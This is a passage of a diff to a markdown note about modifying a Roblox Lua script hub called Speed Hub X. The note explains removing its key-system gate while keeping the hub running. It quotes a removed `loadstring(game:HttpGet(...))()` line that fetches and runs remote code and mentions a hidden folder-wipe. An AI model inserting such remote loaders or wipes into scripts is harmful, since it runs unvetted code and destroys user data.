@@ -22,7 +22,18 @@ was called. That is why deleting the gate leaves a complete, runnable hub.
 
 ## What was changed
 
-1. Deleted the whole key-system tail. The dropped block also contained:
+1. Deleted the whole key-system tail - **and re-added the one line that mattered**. In the
+   original, the tail was the *only* place `fn2` was called:
+
+   ```lua
+   if tbl2:KqNajm...fnSWF() or tbl2 then   -- `or tbl2` is always truthy
+       task.spawn(fn2)                      -- this is what started the hub
+       return
+   end
+   ```
+
+   So deleting the tail wholesale produced a file that loaded and then did nothing. The last
+   line of this build is now `task.spawn(fn2)`. The dropped block also contained:
    - `loadstring(game:HttpGet(".../Webhook/Tracker%20Bosses.lua"))()` - an unrequested
      remote payload
    - a folder-wipe over `Speed_Hub`, `SpeedHubX`, `Speed Hub X`, `Speed Hub`, `Speed_Hub_X`
